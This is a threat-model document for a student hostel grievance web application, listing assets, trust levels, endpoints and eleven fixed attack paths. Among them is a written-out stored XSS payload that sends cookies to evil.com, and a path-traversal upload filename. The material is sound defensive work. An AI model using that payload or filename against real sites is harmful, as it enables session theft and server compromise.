THREAT-MODEL.md  -  HostelGrievance
=====================================

PURPOSE OF THIS DOCUMENT
-------------------------
This document explains what assets the application holds, who is
allowed to access what, where the system can be attacked, and the
specific attack paths that were identified and fixed.


ASSETS (what we are protecting)
--------------------------------

  User Credentials (CRITICAL)
    Email addresses and hashed passwords in the database.
    If stolen, attackers can attempt to crack passwords or
    use them on other services (password reuse attacks).

  Session Tokens (CRITICAL)
    Short-lived tokens stored in the database, sent to users
    as HTTP cookies. If stolen, an attacker can act as that
    user without knowing their password.

  Database File (CRITICAL)
    The SQLite file at data/hostel.db. Contains all user data,
    grievances, comments, and session tokens. If an attacker
    gets this file, they have everything.

  Student Grievance Data (HIGH)
    Grievance titles, descriptions, categories, and status.
    Private between the filing student and the warden.
    Should not be visible to other students.

  File Attachments (HIGH)
    Images uploaded by students as evidence. Private between
    the filing student and the warden.

  Server Filesystem (HIGH)
    The application source code and the uploads folder.
    An attacker who can write files here can take over the server.

  Warden Actions (MEDIUM)
    Status updates and comments made by wardens. Less sensitive
    but should not be modifiable by unauthorized users.


WHO CAN DO WHAT (Trust Levels)
--------------------------------

  Anonymous / Not logged in  [TRUST: NONE]
    Can only reach the login page.
    No API access beyond POST /api/login.

  Student  [TRUST: LOW]
    Can file grievances, add comments, upload attachments.
    Can ONLY access their OWN grievances.
    Cannot access any warden-only functions.

  Warden  [TRUST: MEDIUM]
    Can see ALL grievances and ALL comments.
    Can update grievance status.
    Cannot edit the text content of a student's grievance.

  System Administrator  [TRUST: HIGH]
    Has direct access to the server, database, and files.
    Managed outside the application.

  Attacker (external)  [TRUST: NONE]
    No valid account. Tries to exploit API endpoints directly.

  Attacker (student account)  [TRUST: LOW but HOSTILE]
    Has a valid student login. Tries to access data they
    should not be able to see (other students' grievances).


TRUST BOUNDARIES (where to enforce security)
---------------------------------------------

  [ User's Browser ]
         |
         | (HTTPS - encrypted in production)
         |
  [ Hono API Server ]  <-- All validation and auth checks happen here
         |         |
         |         |  (file read/write)
         |         |
  [ SQLite DB ]  [ Uploads Folder ]
         ^
         | (parameterised SQL only, no raw string injection possible)

  Browser to API:
    UNTRUSTED. All data from the browser is treated as potentially
    malicious. Every field is validated, every action is authorized.

  API to Database:
    Trusted internal boundary. Uses parameterised queries which
    prevent SQL injection entirely.

  API to Filesystem:
    Semi-trusted. Path traversal protections applied. Stored
    filenames are always random hex strings chosen by the server.

  localStorage (in the browser):
    COMPLETELY UNTRUSTED. Contains a copy of the user object for
    displaying the correct UI. The server never trusts claims
    from localStorage for authorization decisions.


ATTACK SURFACE (the entry points)
-----------------------------------

  POST /api/login
    Public - no authentication required.
    Accepts email and password. Rate limited to 5 attempts / IP / min.

  POST /api/grievances
    Requires student authentication.
    Accepts title, description, category, optional image file.
    All fields have min/max length validation.
    File is validated by magic bytes, not just Content-Type.

  GET /api/grievances
    Requires authentication.
    Returns only the logged-in student's own grievances.
    Wardens get all grievances.

  GET /api/grievances/:id
    Requires authentication + ownership check for students.

  PATCH /api/grievances/:id
    Requires authentication + ownership check for students.
    Wardens can update status only, not content.

  GET /api/grievances/:id/comments
    Requires authentication + ownership check for students.

  POST /api/grievances/:id/comments
    Requires authentication + ownership check for students.
    Comment body limited to 2,000 characters.

  POST /api/grievances/:id/attachments
    Requires authentication + ownership check.
    File limited to 2 MB, images only, magic byte verified.

  GET /api/attachments/:id
    Requires authentication + ownership check.
    File served as download (attachment), never inline.

  POST /api/logout
    Requires authentication.
    Destroys session from both cookie and database.


ATTACK PATHS (what we protected against)
------------------------------------------

ATTACK PATH 1 - Insecure Direct Object Reference (IDOR)
  Steps an attacker would take:
    1. Log in as Student A.
    2. Observe that grievance URLs end with IDs like GRV-0001.
    3. Manually change the ID in the URL to GRV-0002.
    4. View Student B's private grievance.
  Previous outcome : Server returned Student B's data to Student A.
  Current outcome  : Server returns 403 Forbidden.


ATTACK PATH 2 - Stored Cross-Site Scripting (XSS)
  Steps an attacker would take:
    1. Log in as a student.
    2. Open a grievance and post a comment containing:
         <script>document.location='http://evil.com?c='+document.cookie</script>
    3. Any user (student or warden) who opens that grievance
       has the script execute in their browser.
    4. The attacker receives the victim's session cookie and
       can log in as them.
  Previous outcome : Script executed for every viewer.
  Current outcome  : Text is displayed as plain characters, not executed.


ATTACK PATH 3 - Session Replay After Logout
  Steps an attacker would take:
    1. Steal a user's session token (e.g. from network traffic).
    2. Wait for the victim to click "Log Out".
    3. Use the stolen token to make API requests.
  Previous outcome : Token still worked after logout.
  Current outcome  : Logout deletes the session from the database.
                     The token returns 401 immediately after logout.


ATTACK PATH 4 - Brute Force Login
  Steps an attacker would take:
    1. Know or guess a student's email address.
    2. Write a script that tries thousands of passwords per minute.
    3. Eventually guess the correct password.
  Previous outcome : No limit on attempts. Brute force possible.
  Current outcome  : Locked out after 5 wrong attempts for 1 minute.


ATTACK PATH 5 - MIME Type Spoofing (Malicious File Upload)
  Steps an attacker would take:
    1. Create a file containing malicious HTML or JavaScript code.
    2. Name it "photo.png" and set Content-Type: image/png.
    3. Upload it as a grievance attachment.
    4. When the warden opens the attachment, the code executes.
  Previous outcome : File accepted, stored, and served to wardens.
  Current outcome  : Magic byte check fails because the file's actual
                     bytes do not match the PNG signature (89 50 4E 47).
                     Upload rejected with 400 Bad Request.


ATTACK PATH 6 - Path Traversal on File Upload
  Steps an attacker would take:
    1. Upload a file with the filename:
         ../../server/app.ts
    2. Server saves the file to that relative path, overwriting
       the application's own source code.
    3. Attacker has modified server code.
  Previous outcome : Original filename was used to store the file.
  Current outcome  : Stored filename is always a random hex string
                     chosen by the server. Original name is ignored.


ATTACK PATH 7 - CSRF (Cross-Site Request Forgery)
  Steps an attacker would take:
    1. Create a malicious web page that sends a POST request to
       the HostelGrievance API when a user visits.
    2. If a logged-in student visits the malicious page, their
       browser automatically attaches the session cookie.
    3. The forged request is accepted as if the student made it.
  Previous outcome : No SameSite flag. CSRF attack works.
  Current outcome  : SameSite=Lax cookie flag prevents the browser
                     from sending the cookie on cross-site requests.


ATTACK PATH 8 - Password Cracking After Database Theft
  Steps an attacker would take:
    1. Obtain a copy of the database file (through a breach).
    2. Extract all password_hash values.
    3. Run them through a rainbow table lookup.
    4. SHA-256 hashes are cracked in seconds.
  Previous outcome : Passwords stored as unsalted SHA-256. Crackable.
  Current outcome  : Passwords stored as bcrypt with 12 rounds and
                     a random salt. Each attempt takes ~300ms. Cracking
                     one password would take years on modern hardware.


ATTACK PATH 9 - User Enumeration via Timing Attack
  Steps an attacker would take:
    1. Write a script that sends login requests with guessed emails.
    2. Measure the response time for each:
         Invalid email  = ~1ms   (server skipped bcrypt)
         Valid email    = ~300ms (server ran bcrypt)
    3. Build a list of confirmed valid email addresses.
    4. Use that list for targeted phishing or brute force.
  Previous outcome : Timing difference was measurable and reliable.
  Current outcome  : Server runs bcrypt even for invalid emails.
                     All responses take ~300ms regardless.


ATTACK PATH 10 - Denial of Service via Large Payloads
  Steps an attacker would take:
    1. Send a POST /api/grievances request with a title that
       is 50 megabytes long.
    2. Repeat thousands of times.
    3. The database fills up and the server slows down or crashes.
  Previous outcome : No length limits. Any size payload accepted.
  Current outcome  : Title limited to 200 chars. Anything larger
                     gets 400 Bad Request immediately.


ATTACK PATH 11 - Information Disclosure via Error Messages
  Steps an attacker would take:
    1. Send malformed or unexpected requests to the API.
    2. Trigger an unhandled server error.
    3. Read the error message in the response:
         "ENOENT: no such file, open 'C:\Users\Lenovo\server\...'"
    4. Use the file paths, OS info, and software versions revealed
       to plan more targeted attacks.
  Previous outcome : Raw error messages sent to the client.
  Current outcome  : All errors return "Internal server error." only.
                     Full details stay on the server console.
